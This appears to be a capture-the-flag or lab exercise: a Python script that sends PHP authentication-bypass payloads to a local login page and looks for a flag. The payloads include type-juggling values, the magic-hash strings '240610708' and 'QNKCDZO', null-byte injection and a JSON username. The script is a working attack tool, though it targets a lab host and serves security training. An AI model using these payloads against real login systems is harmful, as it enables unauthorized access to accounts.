# Objective and context
Test PHP-specific authentication bypass techniques focusing on type juggling and loose comparison vulnerabilities common in PHP 5.6:

```python
import requests
import json

target = "http://127.0.0.1:32907/index.php"

# PHP Type Juggling Tests
# When using == instead of ===, PHP converts types loosely
print("=== PHP Type Juggling & Loose Comparison Tests ===\n")

test_cases = [
    # Type juggling - boolean true bypass
    {"username": "admin", "password": True, "desc": "Boolean true as password"},
    {"username": True, "password": "admin", "desc": "Boolean true as username"},
    {"username": True, "password": True, "desc": "Both boolean true"},
    
    # Magic hash - 0e prefix treated as scientific notation (0 * 10^x = 0)
    # If password hash starts with 0e, and compared with ==, it equals any other 0e hash
    {"username": "admin", "password": "240610708", "desc": "Magic hash 0e462097431906509019562988736854"},
    {"username": "admin", "password": "QNKCDZO", "desc": "Magic hash 0e830400451993494058024219903391"},
    
    # Null byte injection (PHP 5.6 vulnerable)
    {"username": "admin\x00", "password": "anything", "desc": "Null byte in username"},
    {"username": "admin", "password": "test\x00ignored", "desc": "Null byte in password"},
    
    # Integer comparison bypass
    {"username": "admin", "password": 0, "desc": "Integer 0 as password"},
    {"username": 0, "password": "admin", "desc": "Integer 0 as username"},
    
    # Array comparison (empty array == false in PHP)
    {"username": {"0": "admin"}, "password": {"0": "admin"}, "desc": "Nested array"},
    
    # JSON-based bypass attempts
    {"username": '{"user":"admin"}', "password": "test", "desc": "JSON in username"},
]

results = []
for i, payload in enumerate(test_cases, 1):
    try:
        # Test with form-encoded data
        if isinstance(payload["username"], bool):
            data = {"username": str(payload["username"]).lower(), "password": str(payload["password"]).lower()}
        elif isinstance(payload["username"], int):
            data = {"username": str(payload["username"]), "password": str(payload["password"])}
        elif isinstance(payload["username"], dict):
            # Skip dict types for form encoding
            continue
        else:
            data = {"username": payload["username"], "password": payload["password"]}
        
        response = requests.post(target, data=data, timeout=5)
        
        # Check for success indicators
        success = False
        if "FLAG{" in response.text:
            success = True
            print(f"✓ TEST {i}: {payload['desc']}")
            print(f"  FLAG FOUND: {response.text[response.text.find('FLAG{'):response.text.find('}')+1]}")
        elif "Set-Cookie" in str(response.headers):
            success = True
            print(f"✓ TEST {i}: {payload['desc']}")
            print(f"  Cookie set: {response.headers.get('Set-Cookie')}")
        elif response.status_code == 302 or "Location" in response.headers:
            success = True
            print(f"✓ TEST {i}: {payload['desc']}")
            print(f"  Redirect to: {response.headers.get('Location')}")
        elif len(response.text) != 3178 and len(response.text) != 3108:
            print(f"? TEST {i}: {payload['desc']}")
            print(f"  Different response length: {len(response.text)} bytes")
        else:
            print(f"✗ TEST {i}: {payload['desc']} - Same response")
        
        results.append({
            "test": payload["desc"],
            "length": len(response.text),
            "flag_found": "FLAG{" in response.text,
            "cookies": response.headers.get("Set-Cookie", "None")
        })
        
    except Exception as e:
        print(f"✗ TEST {i}: {payload['desc']} - Error: {e}")

print("\n=== Summary ===")
for r in results:
    if r["flag_found"]:
        print(f"SUCCESS: {r['test']}")
print(f"\nTotal tests: {len(results)}")
print(f"Flags found: {sum(1 for r in results if r['flag_found'])}")
```

